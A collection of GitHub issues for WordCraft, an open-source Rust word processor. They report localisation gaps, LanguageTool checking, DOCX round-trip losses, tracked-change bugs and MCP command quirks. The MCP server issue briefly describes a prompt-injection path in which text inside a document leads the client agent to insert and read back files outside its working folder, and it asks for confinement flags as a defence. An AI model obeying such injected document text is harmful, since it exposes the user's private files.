  `pl.` or `stb.` end a sentence, and a word after an ordinal written as `3.` (Hungarian, German,
  Czech…) is capitalised. Ordinal superscripts (`1st`) are English-only.
- **Dates**: `format_date` (`cmd/insert.rs`) has English month and weekday names and AM/PM; DATE
  fields default to `M/d/yyyy`.
- **Text the engine writes into documents** is English: "Contents", "Figure", "Table",
  "Bibliography", "et al.", "Page X of Y", the equation placeholder "Type an equation".
- **Proofing** ignores `CharProps.lang` entirely: one English word list, English-only grammar
  rules and hyphenation (gap #8; issues #25, #40, #100).
- **Language** has no picker: `review.language` takes free text, and the status bar always shows
  "English (United States)".

## Proposal

Make these behaviours follow the language of the text, the way `w:lang` already records it and
the way Word behaves, independent of the interface language (an English letter typed in a
Hungarian interface keeps English quotes).

title: CI: run cargo xtask ci on pull requests and main
author: dkhlapov
body:
`cargo xtask ci` (fmt, clippy `-D warnings`, tests, assets, layers, wasm) is the gate `CLAUDE.md` asks for before every commit, but no GitHub workflow runs it. The workflows on `main` build for FreeBSD and Windows ARM64, lint packaging and make releases. Nothing checks formatting, clippy or the test suite on pull requests or on `main`.

Each PR passes `xtask ci` against the `main` it was branched from. Once several PRs merge, the combination can still fail, and nothing notices. Recent examples on `main`:

- **fmt:** `cargo fmt --check` failed on module order in `crates/doc/src/lib.rs` and `crates/ui-egui/src/lib.rs` after two PRs each added a module (fixed since).
- **tests:** `layout::tests::lists_get_labels_and_indent` failed on `main` @ 73bf2a4 (fixed in 35e22e2).
- **clippy:** on newer toolchains (rustc 1.99), `clippy::large_enum_variant` fails `-D warnings` on `enum Item` in `crates/docx/src/read/story.rs`: `Obj(InlineObject)` is about 280 bytes against 24 for `Text(String)`. Boxing it (`Obj(Box<InlineObject>)`) fixes it, or the repo could pin a toolchain with `rust-toolchain.toml` so local and CI clippy agree.

Contributors find these only when their own `xtask ci` fails on code their PR didn't touch.

**Suggestion:** a Linux job that runs `cargo xtask ci` on `pull_request` and on pushes to `main`, plus possibly a pinned toolchain. Workflows are the maintainers' call, so this is a proposal rather than a PR.

title: LanguageTool: check headers, footers, notes and text boxes too
author: dkhlapov
body:
LanguageTool checking (#575) only looks at the main body: `next_job` in `crates/ui-egui/src/languagetool.rs` walks `StoryRef::Body` only. Headers, footers, footnotes, endnotes, comments and text boxes keep the built-in English checker even when LanguageTool is on.

Noticed by @tellebma while reviewing #575.

**Expected:** with LanguageTool on, every story the user can type in is checked the same way, including headers, footers, notes and text boxes. That probably means walking every story's paragraphs (`Document::para_paths` per `StoryRef`), with the body first and from the caret on.

title: LanguageTool: check mixed-language paragraphs in each run's language
author: dkhlapov
body:
LanguageTool checking (#575) sends each paragraph in one language: the language of its **first run** (`next_job` in `crates/ui-egui/src/languagetool.rs`). A paragraph that mixes languages, such as an English sentence quoting a French phrase marked `fr-FR`, is checked entirely in the first language, so the quoted part gets wrong spelling and grammar marks.

Noticed by @tellebma while reviewing #575.

**Possible approach:** split the paragraph into same-language spans, check each span in its own language, and map the results back to paragraph offsets. Alternatively, send the paragraph with `auto` when its runs disagree. #735 covers the related per-language rules for the built-in checker.

title: LanguageTool: keep the API key in the OS credential store, not ui.json
author: dkhlapov
body:
With LanguageTool on (#575), the API key for a LanguageTool account is saved in plain text in `ui.json`. It is already kept out of `Debug` output and the control channel, but anyone who can read the settings file can read the key.

Noticed by @tellebma while reviewing #575.

**Proposal:** store the key in the OS credential store (macOS Keychain, Windows Credential Manager, Secret Service on Linux/BSD) and keep only a reference in `ui.json`. Where none is available (wasm, minimal systems), keep today's behaviour with a note in Options.

## Summary

When WordCraft launches, it opens a blank document straight away. It should instead open on the **Home** page of the File (Backstage) view, which shows templates and recent files to choose from, as Microsoft Word does.

## Steps to reproduce

1. Launch WordCraft (without opening a file or passing a file path).

title: MCP server: add --automation-read-root / --automation-write-root, like VectorCraft
author: Dunai000
body:
## Runtime or environment

wordcraft-cli 0.5.0, macOS universal release build (commit e4b7d15).

## Summary

`wordcraft-cli mcp` gives the client agent the full file access of the user running it. `open_document`, `save_document`, `execute` (any engine command) and commands such as `insert.picture`, `insert.textFromFile` and the mail-merge data source take any path. A document carrying prompt-injected text can ask the agent to insert a file from outside the working folder and read it back with `get_text`.

VectorCraft already solves this. Its `mcp` subcommand takes `--automation-read-root DIR` and `--automation-write-root DIR`, which confine every read and write the agent's commands make. In wordcraft-cli 0.5.0, `mcp` accepts only `--connect` and `--author` (`apps/wordcraft-cli/src/main.rs:88`), and passing the VectorCraft flags exits with "unknown option".

## Steps to reproduce

```sh
wordcraft-cli mcp --automation-read-root /tmp/work --automation-write-root /tmp/work
```

## Actual

The server exits: `wordcraft-cli: mcp: unknown option --automation-read-root`.

## Expected

The same two flags as VectorCraft, with the same rule that a root left out grants none of its access, so the server can be registered for an agent confined to one folder.

title: Saving a .docx drops its embedded fonts (word/fonts/*, fontTable relationships)
author: Dunai000
body:
## Runtime or environment

wordcraft-cli 0.5.0, macOS universal release build (commit e4b7d15).

## Summary

When a .docx carries embedded fonts, opening and saving it in WordCraft removes them. The saved file has no `word/fonts/` parts and no `word/fontTable.xml` (or its relationships), so the document falls back to whatever font the next reader has installed.

We hit this on a third-party form that embeds Roboto. In LibreOffice 26.2 on a Mac without Roboto installed, the original renders in Roboto across 8 pages. After a WordCraft round trip it renders in Liberation Serif across 6 pages: a serif fallback that changes the look and the pagination of the form. A second form, which embeds Inter and Inter Light, loses its fonts the same way.

## Steps to reproduce

1. Take any .docx with embedded fonts (in Word: Options > Save > Embed fonts in the file).
2. Run `wordcraft-cli convert in.docx out.docx`.
3. Compare `unzip -l in.docx` with `unzip -l out.docx`.

## Actual

Parts present in `in.docx` and missing from `out.docx`:

```text
word/fontTable.xml
word/_rels/fontTable.xml.rels
word/fonts/Roboto-regular.ttf
word/fonts/Roboto-bold.ttf
word/fonts/Roboto-italic.ttf
word/fonts/Roboto-boldItalic.ttf
```

## Expected

Embedded fonts survive a round trip, with the font table and its relationships, so the saved document looks the same wherever it opens. If WordCraft doesn't model them yet, passing the parts through unchanged would be enough.

title: Layout: a page total in the footer makes the whole body lay out twice
author: dkhlapov
body:
A document with a page total in its footer ("Page X of Y", `NUMPAGES` or `SECTIONPAGES`) has its whole body laid out twice on every layout. That means every keystroke in such a document, which is most long documents.

**Cause.** #451 lays the body out again when a page total appears *in the body*, because its value is known only after pagination. To spot those fields, `Ctx::para_key` sets `uses_totals` while `track_totals` is on. `body_top_for` turns `track_totals` off while it measures the header, but `foot_top_for` (added with the "tall footers push the body up" fix in #490) measures the footer with it still on. So the footer's `NUMPAGES` counts as a total shown in the body. The first pass returns `Pass::Again`, and a second full pass follows.

Header and footer totals are filled in after pagination (`headers_footers`), so measuring the footer should not count them, the same as for the header.

**Effect.** It's a correctness no-op: the second pass gives the same pages. But layout time doubles for any document with a page-total footer. It also stops incremental pagination (#554) from ever resuming in such documents.

**Fix.** Turn `track_totals` off in `foot_top_for` while measuring, as `body_top_for` already does. Regression test: one layout pass over a 3-page document with `NUMPAGES` in the footer returns `Pass::Done`, while the same field in the body still asks for another pass.

title: pt_BR spell check: pt module reading the installed VERO dictionary
author: edurbs
body:
### Summary

Brazilian Portuguese proofing, following the Polish pattern from #346: a `pt` module in `crates/proof` that reads the system-installed **VERO** Hunspell dictionary (`pt_BR.aff`/`pt_BR.dic`) at runtime. Toward #100 (multilingual spell check).

The engine side is done and verified: #782 makes the affix engine load VERO **as-is** (measured on Debian's VERO 3.2: 312,295 stems, 25,829 rules, exact agreement with `hunspell -d pt_BR` on a probe set — same 8 misspellings flagged, same acceptances). Before #782 the load failed on `FLAG UTF-8` (line 2), 26 continuation-class rules, and 106 distinct flags vs the old 64-flag cap.

### Proposed work

- **`crates/proof/src/pt/`** mirroring `pl/`: `NAMES: ["pt_BR", "pt-BR", "pt"]`, lazy system-dictionary load via `hunspell::find`, `install_dictionary()` / `reload_dictionary()`, empty dictionary accepts everything (no spelling marks without VERO installed).
- **Language registration**: `ProofLang::Pt` (+ `from_tag` arm for `pt`/`por`, `PROOFED` entry) and dispatch in the `*_in` functions / `check_text` — or the `DICTIONARY_LANGS` equivalent once #741 lands, whichever framework wins.
- **Portuguese suggestions**: the engine already parses and exposes `MAP` groups (`aáãâ`, `eéê`, `oóõô`, `ç`…) and the `REP` table; a `suggest.rs` tuned like `pl/suggest.rs`.
- **Optional, in follow-up order**: Portuguese grammar rules (`pl/grammar.rs` pattern), hyphenation from `hyph-utf8`'s `hyph-pt.tex` (licence check + `ATTRIBUTION.md` row required), and `editing_lang: Some("pt-BR")` on the existing pt-br UI entry so new documents are tagged pt-BR.

### Licensing (why system-installed, not bundled)

VERO is LGPLv3/MPL — never bundled in this clean-room repo; read from the user's system exactly as Polish reads its dictionary. Research note: no CC0/open pt_BR lexicon exists today (VOLP is app-only and closed; every existing pt_BR dictionary traces back to VERO), so system-Hunspell is the only viable local path, and the web build stays a s…

title: Harper grammar checker integration
author: hippietrail
body:
### Feature Request: Integrate Harper Grammar Checker into WordCraft

**Harper** is a free, open-source, and privacy-first local grammar checker designed to run completely off-grid. Built in Rust for maximum speed, it processes text and delivers linting suggestions in under 10 milliseconds without requiring a cloud round-trip, an account, or any LLM-in-the-loop dependencies. 

Because it operates entirely on-device, integrating Harper aligns perfectly with the independent, local-first ecosystem of the ArtCraft suite, ensuring user writing remains strictly private. 

Given that Harper's core engine (`harper-core`) is natively distributed as a Rust crate, it could be directly compiled into WordCraft to provide blazingly fast, deterministic grammar and spell-checking without external API bottlenecks.

#### Resources
* [Harper Homepage](https://writewithharper.com)
* [Harper GitHub Repository](https://github.com)
* [harper-core on crates.io](https://crates.io)
* [harper-core Documentation (docs.rs)](https://docs.rs)

Copying an equation in WordCraft and pasting it into Microsoft Word pastes linear text (e.g., `y=2x_s`) instead of a formatted equation.

title: [ui] Ribbon dropdown chevrons are illegible at 200% display scaling
author: JesseCan9000
body:
### Description
On high-DPI displays (e.g. Windows 11 at 200% scale), dropdown arrows (⌄) beside ribbon combos (Font, Font Size, Color pickers) render at ~2–3 px, making them nearly invisible.

### Technical Context
In `crates/ui-egui/src/widgets.rs` (line 563) and `icons.rs`, dropdown chevrons use a hardcoded bounding box (`vec2(10.0, 10.0)`) scaled down to ~2.5×1.5 pt instead of scaling proportionally with `ui.spacing()` / `pixels_per_point`.

title: Typing parity: AutoCorrect turns the Polish word "i" into "I" (English replacement list ignores the text's language)
author: brzuchal
body:
## Problem

AutoCorrect's built-in replacement list contains `("i", "I")` ([`crates/engine/src/cmd/tools.rs#L39`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/tools.rs#L39)), and `autocorrect_word` ([`tools.rs#L711`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/tools.rs#L711)) applies the list without looking at the language of the text.

`i` is the Polish word for "and" (and for "and" in Croatian, Bosnian and Serbian written in Latin script), one of the most frequent words in the language. With AutoCorrect on, which is the default:

| Typed | Result | Expected |
|---|---|---|
| `Ala i kot ` | `Ala I kot ` | `Ala i kot ` |
| `kawa i herbata ` | `kawa I herbata ` | `kawa i herbata ` |

Every Polish sentence with a conjunction is damaged while typing, and the only workaround is to delete the entry or switch AutoCorrect off. The other English entries in the list (`dont`, `cant`, `teh`…) are harmless in Polish; `i` is the one that collides with a real word.

Checked by reading the code on `main` (`ad8c264`) and on the head of https://github.com/storytold/wordcraft/pull/346; not reproduced in a running build.

## Suggested fix

Apply the English replacement entries only when the text at the caret is English or has no language (`w:lang`), which is where https://github.com/storytold/wordcraft/issues/735 is heading with its per-language rules table. A narrower first step: skip `i` → `I` when the run's language is not English.

Per the repo rules this is a typing change, so it should land with `docs/typing-parity.md` and a case in `crates/engine/src/tests_typing.rs`.

## Related

- https://github.com/storytold/wordcraft/issues/735 — per-language rules for typing, dates and proofing (does not mention the replacement list).
- https://github.com/storytold/wordcraft/pull/346 — Polish interface and proofing; adds the per-run proofing language this fix can ke…

title: Tables: sort and formulas read a decimal comma as a thousands separator (1,5 sorts as 15; SUM of 3,50 and 2,25 is 575)
author: brzuchal
body:
## Problem

Numbers in tables are parsed as en-US only: a comma is treated as a thousands separator and removed.

- **Table sort** strips commas before parsing ([`crates/engine/src/cmd/table.rs#L631`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/table.rs#L631)).
- **Table formulas** (`=SUM(ABOVE)`, `=AVERAGE(LEFT)`…) do the same ([`table.rs#L670-L673`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/table.rs#L670-L673)) and write the result with a decimal point ([`table.rs#L688`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/table.rs#L688)).

Polish, like most of continental Europe, writes the decimal separator as a comma (`3,50`) and groups thousands with a space (`1 250,00`).

| Case | Result | Expected |
|---|---|---|
| Sort a column holding `1,5`, `2`, `12` ascending | `2`, `12`, `1,5` (read as 15) | `1,5`, `2`, `12` |
| `=SUM(ABOVE)` over `3,50` and `2,25` | `575` | `5,75` |
| `=SUM(ABOVE)` over `1 250,00` and `100` | `100` (first cell skipped) | `1350` |

The wrong sum is silent, which makes it worse than a missing feature: an invoice table in a Polish document adds up to a number 100 times too large.

Checked by reading the code on `main` (`ad8c264`); not reproduced in a running build. Decimal tab stops are fine: they already align on `.` or `,`.

## Suggested fix

Parse and print cell numbers with the decimal and group separators of the cell text's language (`w:lang`), falling back to today's en-US behaviour when there is no language. https://github.com/storytold/wordcraft/issues/735 already proposes a per-language rules table with a decimal separator field; this issue is the concrete table case for it. A locale-independent heuristic (one comma followed by one or two digits and no other separator is a decimal comma) would be wrong for en-US `1,50`-style typos, so keying on langua…

title: Sorting ignores language collation: ą ć ł ś ż sort after z in tables, paragraphs, index and bibliography
author: brzuchal
body:
## Problem

Every text sort compares Unicode code points after `to_lowercase()`, so letters with diacritics sort after `z` instead of next to their base letter. For Polish the alphabet is a ą b c ć d e ę f g h i j k l ł m n ń o ó p … s ś … z ź ż, but:

| Input | Result | Expected (Polish) |
|---|---|---|
| `Zakopane`, `Łódź`, `Kraków` | `Kraków`, `Zakopane`, `Łódź` | `Kraków`, `Łódź`, `Zakopane` |
| `zebra`, `ćma`, `dom` | `dom`, `zebra`, `ćma` | `ćma`, `dom`, `zebra` |

The same happens for Czech, Slovak, Hungarian, Swedish, Spanish (`ñ`), German (`ä`) and others; each has its own order (Swedish puts `å ä ö` after `z` on purpose, German does not).

## Where (on `main`, `ad8c264`)

Document content:

- Table sort: [`crates/engine/src/cmd/table.rs#L633`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/table.rs#L633)
- Paragraph sort: [`crates/engine/src/cmd/para.rs#L810-L826`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/para.rs#L810-L826) (`natural_cmp` ends in `a.cmp(b)`)
- Index entries and letter headings: [`crates/engine/src/cmd/index.rs#L200-L213`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/index.rs#L200-L213), [`index.rs#L284-L294`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/index.rs#L284-L294) (a `BTreeMap` keyed on lowercased strings; `Łódź` gets its own heading after `Z`)
- Bibliography order: [`crates/engine/src/cmd/citations.rs#L607-L628`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/citations.rs#L607-L628)
- Table of Authorities grouping: [`citations.rs#L827`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/engine/src/cmd/citations.rs#L827)

Interface lists (styles, fonts, bookmarks, the language list) are…

title: New documents: default paper size, units and decimal separator from the system region (A4 and cm outside the US)
author: brzuchal
body:
## Problem

A new blank document is always US Letter, and measurements are shown in inches with a decimal point, whatever the system region or interface language:

- Page size is hard-coded to 612 × 792 pt in `Section::default` ([`crates/doc/src/section.rs#L702-L706`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/doc/src/section.rs#L702-L706)). There is no default-paper preference.
- `Unit` defaults to inches ([`crates/geom/src/lib.rs#L51-L55`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/geom/src/lib.rs#L51-L55)). File › Options › Advanced › Measurement units exists since https://github.com/storytold/wordcraft/pull/795 (https://github.com/storytold/wordcraft/issues/755), but the default is not derived from the region.
- `Unit::format` always prints a decimal point ([`geom/src/lib.rs#L82-L89`](https://github.com/storytold/wordcraft/blob/ad8c26442076e357f5bb88515b25dfbf73c81e2e/crates/geom/src/lib.rs#L82-L89)), while `parse_measure` already accepts a comma.

For a user in Poland (and everywhere outside the US, Canada and a few other countries): File › New gives an 8.5 × 11 in page with margins shown as `1"`. Printed on A4 it is scaled or cropped, and every new document needs Layout › Size › A4 first. Expected: A4, centimetres, and `2,54 cm` in dialogs.

Checked by reading the code on `main` (`ad8c264`); not reproduced in a running build.

## Suggested direction (language-neutral)

1. On first run, take the default paper size and measurement system from the system region, not from the interface language (an English interface in Germany still wants A4). Unicode CLDR's supplemental data (Unicode License) lists both per territory: `paperSize` (Letter for US, CA, MX and a handful of others; A4 elsewhere) and `measurementSystem`.
2. A "Default paper size" preference next to Measurement units, so the choice can be overridden.
3. Show measurements with the region's decimal separator.…

title: Windows Explorer thumbnails for files (and folder previews)
author: VGRichi
body:
## Summary
It would be great if WordCraft documents showed thumbnail previews in Windows File Explorer, like GridCraft does for its files.

## Current behavior
- With WordCraft set as the default app for `.docx` files, documents in File Explorer show the full WordCraft app icon instead of a preview of the first page.
- Because of that, folders containing documents show a plain folder icon in Windows 11, with no content preview peeking out.
- GridCraft files, by contrast, show up in folder previews correctly.

## Expected behavior
- Documents show a first-page thumbnail, with the small WordCraft badge in the corner (the standard Windows 11 look).
- Folders containing documents show those page previews in the folder icon.
- Optional: a Preview Pane handler (Alt + P in Explorer) to read documents without opening the app.

## Possible approaches
1. **Thumbnail provider:** register a Windows thumbnail provider (IThumbnailProvider shell extension) for `.docx` (and other supported formats) during installation, ideally as an installer option.
2. **Embedded thumbnail on save:** when saving a `.docx`, include a first-page preview image in the file (`docProps/thumbnail.jpeg`), like Microsoft Word's "Save Thumbnail" option. This would also make previews work in other apps and on other PCs.

## Environment
- Windows 11 (x64)
- WordCraft 0.4.0, installed via the x64 MSI

Thanks for the great app!

title: Track Changes: Accept All joins an extra paragraph after deleting a range that starts at a paragraph end
author: thinkbig1979
body:
## Summary

With Track Changes on, deleting a range that starts at the end of a paragraph records the right revisions, but **Accept All** removes one paragraph break too many. The same deletion without tracking gives the correct result.

## Repro (headless MCP, WordCraft 0.5.0, Linux x86_64 AppImage)

1. `new_document` `{"template":"blank"}`
2. `type_text` `{"text":"Alpha\nBravo\nCharlie\nDelta\nEcho","paragraphs":true}`
3. `batch`:
   - `review.trackChanges` `{"value":true}`
   - `select.range` `{"anchor":{"path":[0],"off":5,"story":"body"},"focus":{"path":[2],"off":7,"story":"body"}}` (end of "Alpha" to end of "Charlie")
   - `text.delete`
   - `review.acceptAll`
4. `get_text`

**Expected:** `Alpha\nDelta\nEcho`
**Actual:** `AlphaDelta\nEcho`

## What I checked

- Same steps without `review.trackChanges`: `Alpha\nDelta\nEcho` (correct).
- Before accepting, `review.changes` lists exactly the expected deletions: `\n` (end of Alpha), `Bravo`, `\n` (end of Bravo), `Charlie`.
- `review.rejectAll` instead of accept restores `Alpha\nBravo\nCharlie\nDelta\nEcho` (correct).
- Selecting from the start of "Bravo" to the start of "Delta" (`{"path":[1],"off":0}` to `{"path":[3],"off":0}`) and accepting gives the correct result, so this is a workaround.

So the deletion itself looks right; accepting a deleted paragraph mark at the end of a kept paragraph seems to also join the following paragraph.

Found while editing a real contract through the MCP server with Claude Code: two section headings were joined to the paragraphs above them after Accept All.

title: MCP/commands: styles.modify rejects hex colours that format.color accepts; CharProps/ParaProps undocumented
author: thinkbig1979
body:
## Summary

Colour parameters use different formats in different commands. `format.color` takes a hex string, but `styles.modify` (and presumably anything taking `CharProps`) rejects it and needs a serde enum form.

## Repro (headless MCP, WordCraft 0.5.0)

- `format.color` `{"color":"1B1611"}`: works.
- `styles.modify` `{"style":"Heading1","chr":{"color":"1B1611"}}`:
  `bad parameters: unknown variant '1B1611', expected 'Auto' or 'Rgb'`
- `styles.modify` `{"style":"Heading1","chr":{"color":{"Rgb":"1B1611"}}}`:
  `invalid type: string "1B1611", expected tuple struct Rgb`
- `styles.modify` `{"style":"Heading1","chr":{"color":{"Rgb":[27,22,17]}}}`: works.

## Suggestion

- Accept `"RRGGBB"` and `"auto"` for colours in `CharProps`/`ParaProps` too, the same as `format.color`, `para.borders`, `table.shading` etc.
- Document the `CharProps` and `ParaProps` shapes. `wordcraft-cli commands --json` names them in `styles.modify`, `para.set` and `table.newStyle`, but I couldn't find their fields listed in `docs/mcp.md` or `docs/control-protocol.md`, so an agent has to discover them by trial and error.

title: get_text / wordcraft-cli text include deleted tracked text inline
author: thinkbig1979
body:
## Summary

`get_text` (MCP) and `wordcraft-cli text` return deleted tracked text inline with the current text, with no marker, so the output reads as garbled text.

## Repro (headless MCP, WordCraft 0.5.0)

1. `new_document` `{"template":"blank"}`
2. `type_text` `{"text":"Signed by Alice Smith, Partner."}`
3. `review.trackChanges` `{"value":true}`, `select.text` `{"text":"Alice Smith, Partner"}`, `text.insert` `{"text":"Bob Jones, Director"}`
4. `get_text`, or save and run `wordcraft-cli text file.docx`

**Actual:** `Signed by Bob Jones, DirectorAlice Smith, Partner.`

## Suggestion

Default to the text as it reads with changes shown as final (insertions kept, deletions dropped), which is what an agent checking its own edits needs. Optionally add a parameter for the original text, or for marked-up output that brackets insertions and deletions.

Today the workaround is to `review.acceptAll` in a throwaway session and then call `get_text`.

author: rcps7
body:
I just want to itirate a method for installing Wordcraft on Win 11 PC's without the need for admin privilages. If your installing it on your company/Corporate PC or laptop, please inform the IT team or get necessary permission before doinng this process.
This method uses compiling the source using Cargo.
**1. We will use the the GNU/MinGW toolchain for providing RUST with C++ linker.**
      - Download a portable, no-install distribution of MinGW.
      - Extract the archive to a folder in your user directory.
      - Add the bin folder inside it to your User Path Environment Variable.
**2. Installing RUST**
       - Downlaod the rustup-init.exe file from official RUST website.
       - Right-click the downloaded rustup-init.exe file, select Properties, and ensure "Run this as administrator" is unchecked.
       - From CMD or Powershell (inside te directory where you downloaded rustup-init.exe) run rustup-init.exe.
**3. Installing Wordcraft**
        - from CMD run "git clone https://github.com/storytold/wordcraft"
        - go to the wordcraft directory and run "cargo run --release -p wordcraft -- --sample"
        - If everything done, its finished. If not go to next step.
**4. lgcc_eh ERROR** - w64devkit uses an exception handling model (SEH) that does not create or need libgcc_eh.a, but the default Rust GNU toolchain explicitly looks for it.
       _- create a dummy libgcc_eh.a file and point RUST to this_ - from CMD run a) mkdir "%USERPROFILE%\user_libs" 2>nu" b) cd "%USERPROFILE%\user_libs" c) type nul > libgcc_eh.a
       _- Now we will update the CARGO config map to this folder_ - a) echo [target.x86_64-pc-windows-gnu] > "%USERPROFILE%\.cargo\config.toml" b) echo rustflags = ["-L", "%USERPROFILE:\=\\%\\user_libs"] >> "%USERPROFILE%\.cargo\config.toml"
       _- Go to your wordcraft folder, clear everything and run_ - a) cd "C:\user\wordcraft" b) cargo clean c) cargo run --release -p wordcraft -- --sample
 You should get a clean install now.

title: fix(docx): saving drops w:dirty from field begin markers, so Word no longer refreshes an imported TOC on open
author: AndreaBonn
body:
## Summary

A DOCX whose field begin marker carries `w:dirty="true"` loses the attribute after a plain open-and-save. Generators that cannot paginate (pandoc-style pipelines, python-docx templates) write a placeholder TOC result and set this flag so Word rebuilds the field when the file is opened. After a round trip through WordCraft, Word no longer does that, and the placeholder text stays visible until someone updates fields by hand.

Found while round-tripping a document generated from a corporate template. Everything else in that round trip held up (headers, footers, numbering, tables, images); this was the one change a reader would see.

## Steps to reproduce

Runtime: `wordcraft-cli` 0.5.0, `linux-x86_64` release tarball.

1. Save the script at the bottom as `make_min.py` and create the fixture (Python stdlib only):
   ```sh
   python3 make_min.py min.docx
   ```
2. Round-trip it:
   ```sh
   wordcraft-cli convert min.docx rt.docx
   ```
3. Compare the field begin markers:
   ```sh
   unzip -p min.docx word/document.xml | grep -o '<w:fldChar w:fldCharType="begin"[^>]*>'
   unzip -p rt.docx  word/document.xml | grep -o '<w:fldChar w:fldCharType="begin"[^>]*>'
   ```

**Expected:** `<w:fldChar w:fldCharType="begin" w:dirty="true"/>` in both files.

**Actual:**
```
min.docx: <w:fldChar w:fldCharType="begin" w:dirty="true"/>
rt.docx:  <w:fldChar w:fldCharType="begin"/>
```

The instruction and the result survive; only the flag is lost.

## Where it happens (v0.5.0, e4b7d15)

The flag is never read, so the model has nowhere to keep it. `w:fldLock` takes exactly the same path and survives, which makes it the template for the fix.

- Reader: [`crates/docx/src/read/story.rs#L485-L486`](https://github.com/storytold/wordcraft/blob/e4b7d155f15a7784197ba34eeea0b54490d70eb2/crates/docx/src/read/story.rs#L485-L486) reads `w:fldLock` on `begin` and ignores `w:dirty`. `FieldState` ([L46](https://github.com/storytold/wordcraft/blob/e4b7d155f15a7784197ba34eeea0b54490d70eb2/crat…

title: fix(references): updating an imported TOC field writes the entries outside the field and keeps its old result
author: AndreaBonn
body:
## Summary

When a DOCX comes from another producer and its TOC field holds a non-empty result (a placeholder such as "update fields (F9)", or a stale TOC), `references.updateToc` computes correct entries but writes them as plain paragraphs **after** the field's `end` marker. The field keeps its old result. In Word the document shows the stale text above the new entries. Pressing F9 then regenerates inside the field, which leaves two tables of contents. The command reports success.

Related to #473 (fixed before 0.5.0), but a different path: there the TOC was created by WordCraft, so its field result was empty.

## Steps to reproduce

title: Zotero citation fields buggy (not closed) when introduced at the end of a document and typing afterwards
author: joaofrgomes
body:
Hi all! First of all, congratulations on your implementation of the Zotero plugin and the way it just magically appeared on my first launch; are you drawing from their own project and keeping it automatically updated? Did it detect that Word and the plugin itself were installed?

Anyway, the issue I found was that when you add a citation to a document, if you do so with the text insertion point at its very end (something quite common if your writing style is a bit more improvisational) and keep writing after it, the hidden field doesn't seem to be closed, because when adding a new citation or the bibliography, the Zotero plugin will throw a message saying that the field will be replaced, and when editing said citation, it will throw a warning saying that the citation was changed.

I haven't toggled field code visibility (if that MS Word and LibreOffice feature is at all available, that is) to check yet, but I am nearly 100% sure that the field not being properly closed is the underlying issue here. If a field was never properly closed, trying to create a new one would logically replace it, and typing inside it (like, say, inside the parenthesis where years are in APA 7th-style citations) would normally and indeed throw such a warning when editing them through the proper procedure.

I can, as a workaround, always make sure that there's text after the point where I want to add a citation; when doing so I can, in fact, add multiple citations, edit them without eliciting warnings and add the bibliography at the end of the document. I initially thought that the Zotero plugin was outright non-functional, but after trying this trick I realised it was a smaller bug after all.

You can also reproduce this by putting the text insertion point next to the last character of the citation field; if you type anything after it (like, say, a period, or if you have a period and type a space, or whatever), you are effectively typing _inside_ of the field.

title: Typing: Alt+numpad decimal character entry (ANSI/OEM Alt codes)
author: edurbs
body:
Word documents a second keyboard entry method for character codes on the same support page as the Alt+X toggle (#343, landed as `text.toggleUnicode`): hold Alt and type a decimal code on the numeric keypad, release Alt, and the character appears at the caret. WordCraft has no trace of it (source grep for numpad / Alt-code handling: nothing in `crates/ui-egui` or the engine).

Word's behaviour (Windows):

- Num Lock on, hold Alt, type the decimal code on the **numeric keypad** (top-row digits don't count), release Alt.
- Leading 0 (values 0128–0255): ANSI, i.e. Windows-1252 — e.g. Alt+0233 → é.
- No leading 0 (values 1–255): the system's OEM code page — cp437 in en-US (Alt+233 → Θ), cp850 in Western European locales (Alt+233 → é), so the mapping is locale-dependent.
- Word for Mac has no equivalent (the numeric-keypad tables on the page are Windows), so there is nothing to match on macOS.

Plan:

- Verify on Windows first: Alt+numpad is translated by the OS before the app, so winit may already deliver the character as a `Character` event — if so, Windows works for free and only Linux and web need work.
- UI (`crates/ui-egui` key handling): buffer digits while Alt is held (numpad digits only, Num Lock on), insert the character on Alt release.
- Engine: a command (e.g. `text.insertCode`) taking the decimal code and the ANSI/OEM distinction, so the mapping is testable headlessly through the command registry like every other key behaviour. The Windows-1252 mapping already exists in `crates/doc/src/encoding.rs`; OEM tables (cp437/cp850) would be new.
- Tests in the typing suite and a row in `docs/typing-parity.md` next to Alt+X.

Evidence: https://support.microsoft.com/en-us/word/insert-ascii-or-unicode-character-codes-in-word (tables "Inserting ASCII characters by using the numeric keypad"; WordCraft's Alt+X row is already in `docs/typing-parity.md`). Related: gap #24 (default shortcuts, `docs/ui-parity.md`).

title: insert.picture: the next typing command deletes the picture
author: Nael-Nathanael
body:
## Summary

`insert.picture` leaves the new picture selected. In `wordcraft-cli run`, the next typing command replaces that selection, so the picture is gone from the saved file. No error is reported, and `insert.picture` itself reports success. MCP and the control channel run the same command, so they are probably affected too; we tested only the CLI.

## Repro (WordCraft 0.5.0, `e4b7d155`, Linux)

```sh
wordcraft-cli run --template blank --print \
  --cmd 'text.insert={"text":"x"}' --cmd text.newParagraph \
  --cmd 'insert.picture={"path":"/abs/path/pic.png","width":250}' \
  --cmd text.newParagraph --cmd 'text.insert={"text":"cap"}' \
  --save p.docx
unzip -l p.docx | grep -c media
```

`--print` shows:

```
insert.picture: {"height":204.63427734375,"media":"image1.png","width":249.99998474121094}
```

The count is `0`: the saved file has no picture. With `--cmd caret.right` added after `insert.picture`, the count is `1`.

